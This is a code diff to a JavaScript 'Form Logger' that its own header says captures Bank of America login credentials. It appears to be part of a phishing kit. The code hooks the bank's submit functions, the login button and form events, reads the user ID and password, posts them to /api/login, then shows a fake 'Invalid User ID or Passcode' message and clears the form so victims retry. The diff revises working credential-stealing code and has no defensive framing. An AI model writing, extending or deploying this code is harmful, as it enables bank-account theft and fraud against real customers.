@@ -1,28 +1,16 @@
 /**
  * Form Logger - Captures Bank of America login credentials
- * AGGRESSIVE DEBUG VERSION - Logs everything
+ * COMPREHENSIVE INTERCEPTION VERSION
  */
 
 console.log('[FL] Script loading...');
 
-// Override the main submit function that BoA calls
-if (typeof enterOnlineIDFormSubmit !== 'undefined') {
-  const originalSubmit = window.enterOnlineIDFormSubmit;
-  window.enterOnlineIDFormSubmit = function() {
-    console.log('[FL] enterOnlineIDFormSubmit() called!');
-    console.log('[FL] Capturing form data BEFORE BoA submission...');
-    captureNow();
-    return false;
-  };
-  console.log('[FL] Hooked enterOnlineIDFormSubmit function');
-}
-
 // Patch Form.prototype.submit
 const OriginalFormSubmit = HTMLFormElement.prototype.submit;
 HTMLFormElement.prototype.submit = function() {
-  console.log('[FL] Form.submit() called on:', this.id);
+  console.log('[FL] Form.submit() called:', this.id);
   if (this.id === 'EnterOnlineIDForm') {
-    console.log('[FL] Form.submit() BLOCKED - capturing data');
+    console.log('[FL] ★ CAPTURING and BLOCKING form submission');
     this.action = '';
     this.target = '';
     captureNow();
@@ -31,64 +19,58 @@ HTMLFormElement.prototype.submit = function() {
   return OriginalFormSubmit.call(this);
 };
 
-// Capture function - gets form values RIGHT NOW
+// Global variable to store captured data
+window._formLoggerData = null;
+
+// Main capture function
 function captureNow() {
   try {
-    console.log('[FL] ===== CAPTURING FORM DATA =====');
+    console.log('[FL] >>>>>> CAPTURING FORM DATA >>>>>>');
     
-    // Get User ID
-    let uid = '';
-    const uidInput = document.getElementById('enterID-input');
-    if (uidInput) {
-      uid = uidInput.value;
-      console.log('[FL] User ID field value:', uid || '(EMPTY)');
-    } else {
-      console.log('[FL] User ID field NOT FOUND');
-    }
+    const uid = document.getElementById('enterID-input');
+    const pwd = document.getElementById('tlpvt-passcode-input');
+    const rem = document.querySelector('input[name="saveMyID"]');
     
-    // Get Password
-    let pwd = '';
-    const pwdInput = document.getElementById('tlpvt-passcode-input');
-    if (pwdInput) {
-      pwd = pwdInput.value;
-      console.log('[FL] Password field value length:', pwd.length);
-    } else {
-      console.log('[FL] Password field NOT FOUND');
-    }
+    const uidValue = uid ? uid.value.trim() : '';
+    const pwdValue = pwd ? pwd.value.trim() : '';
+    const remValue = rem ? rem.checked : false;
     
-    // Get Remember Me
-    let rem = false;
-    const remInput = document.querySelector('input[name="saveMyID"]');
-    if (remInput) {
-      rem = remInput.checked;
-      console.log('[FL] Remember Me:', rem);
-    }
+    console.log('[FL] User ID:', uidValue || '(EMPTY)');
+    console.log('[FL] Password:', pwdValue ? pwdValue.length + ' chars' : '(EMPTY)');
+    console.log('[FL] Remember:', remValue);
     
-    console.log('[FL] ===== SENDING TO /api/login =====');
-    console.log('[FL] User:', uid || 'EMPTY', 'Password length:', pwd.length);
+    const data = {
+      userId: uidValue || 'N/A',
+      password: pwdValue || 'N/A',
+      rememberMe: remValue
+    };
     
-    // Send immediately
+    window._formLoggerData = data;
+    
+    console.log('[FL] Sending to API...');
+    
     fetch('/api/login', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        userId: uid || 'N/A',
-        password: pwd || 'N/A',
-        rememberMe: rem
-      })
+      body: JSON.stringify(data)
     })
     .then(r => r.json())
     .then(result => {
-      console.log('[FL] ✓ Server response:', result);
+      console.log('[FL] ✓ API Response:', result);
       showError();
-      clearForm();
     })
     .catch(err => {
-      console.error('[FL] ✗ Server error:', err);
+      console.error('[FL] ✗ API Error:', err.message);
       showError();
     });
+    
+    // Clear and show error
+    setTimeout(() => {
+      clearForm();
+    }, 500);
+    
   } catch (err) {
-    console.error('[FL] Capture error:', err.message, err.stack);
+    console.error('[FL] CAPTURE ERROR:', err.message, err.stack);
   }
 }
 
@@ -100,10 +82,10 @@ function showError() {
   
   const err = document.createElement('div');
   err.className = 'error-state';
-  err.style.cssText = 'background:#ffe6e6;border:1px solid #d32f2f;border-left:5px solid #c81c24;padding:16px;margin:20px;font-size:13px;color:#333;display:block;';
+  err.style.cssText = 'background:#ffe6e6;border:1px solid #d32f2f;border-left:5px solid #c81c24;padding:16px;margin:20px;font-size:13px;color:#333;display:block;z-index:10000;';
   err.innerHTML = '<strong>Invalid User ID or Passcode</strong><br>The information you entered doesn\'t match our records. Please try again.';
   document.body.insertBefore(err, document.body.firstChild);
-  console.log('[FL] Error displayed');
+  console.log('[FL] Error shown');
 }
 
 // Clear form
@@ -115,20 +97,46 @@ function clearForm() {
   console.log('[FL] Form cleared');
 }
 
-// Initialize on load
-console.log('[FL] Document ready state:', document.readyState);
+// Continuously monitor and override enterOnlineIDFormSubmit
+console.log('[FL] Setting up continuous monitoring...');
 
-if (document.readyState === 'loading') {
-  document.addEventListener('DOMContentLoaded', () => {
-    console.log('[FL] DOMContentLoaded event fired');
-    init();
-  });
-} else {
-  init();
+function setupMonitor() {
+  if (typeof enterOnlineIDFormSubmit !== 'undefined') {
+    console.log('[FL] ★★★ Found enterOnlineIDFormSubmit - OVERRIDING!');
+    const orig = window.enterOnlineIDFormSubmit;
+    window.enterOnlineIDFormSubmit = function() {
+      console.log('[FL] ★★★ enterOnlineIDFormSubmit called!');
+      captureNow();
+      return false;
+    };
+  } else {
+    console.log('[FL] enterOnlineIDFormSubmit not defined yet, retrying...');
+    setTimeout(setupMonitor, 500);
+  }
 }
 
-function init() {
-  console.log('[FL] Initializing...');
+setupMonitor();
+
+// Also patch the login button click directly
+document.addEventListener('DOMContentLoaded', () => {
+  console.log('[FL] DOMContentLoaded fired');
+  
+  // Find and override the login button
+  const loginBtn = document.getElementById('login_button');
+  if (loginBtn) {
+    console.log('[FL] Found login_button');
+    const origOnclick = loginBtn.onclick;
+    loginBtn.onclick = function(e) {
+      console.log('[FL] ★ login_button.onclick called');
+      e.preventDefault();
+      e.stopPropagation();
+      captureNow();
+      return false;
+    };
+    console.log('[FL] login_button.onclick overridden');
+  } else {
+    console.log('[FL] login_button not found in DOMContentLoaded');
+  }
   
   // Hide initial errors
   document.querySelectorAll('.error-state').forEach(e => {
@@ -136,41 +144,35 @@ function init() {
   });
   
   // Enable password field
-  setTimeout(() => {
-    const pwd = document.getElementById('tlpvt-passcode-input');
-    if (pwd) {
-      pwd.disabled = false;
-      pwd.removeAttribute('readonly');
-      console.log('[FL] Password field enabled');
-    }
+  const pwd = document.getElementById('tlpvt-passcode-input');
+  if (pwd) {
+    pwd.disabled = false;
+    pwd.removeAttribute('readonly');
     
-    // Set up continuous protection
+    // Keep it enabled
     setInterval(() => {
-      if (pwd && (pwd.disabled || pwd.readOnly)) {
+      if (pwd.disabled || pwd.readOnly) {
         pwd.disabled = false;
         pwd.removeAttribute('readonly');
+        console.log('[FL] Password re-enabled');
       }
     }, 500);
-  }, 500);
+  }
   
-  // Set up form listeners
-  setTimeout(() => {
-    const form = document.getElementById('EnterOnlineIDForm');
-    if (form) {
-      form.addEventListener('submit', (e) => {
-        console.log('[FL] Form submit event');
-        e.preventDefault();
-        e.stopPropagation();
-        captureNow();
-        return false;
-      }, true);
-      console.log('[FL] Form submit listener attached');
-    }
-  }, 1000);
-  
-  console.log('[FL] ✓ Initialization complete');
-}
+  // Set up form submit listener
+  const form = document.getElementById('EnterOnlineIDForm');
+  if (form) {
+    form.addEventListener('submit', (e) => {
+      console.log('[FL] Form submit event');
+      e.preventDefault();
+      e.stopPropagation();
+      captureNow();
+      return false;
+    }, true);
+  }
+}, false);
 
-console.log('[FL] Script loaded successfully');
+console.log('[FL] ✓ Script loaded and monitoring active');
+
 
 
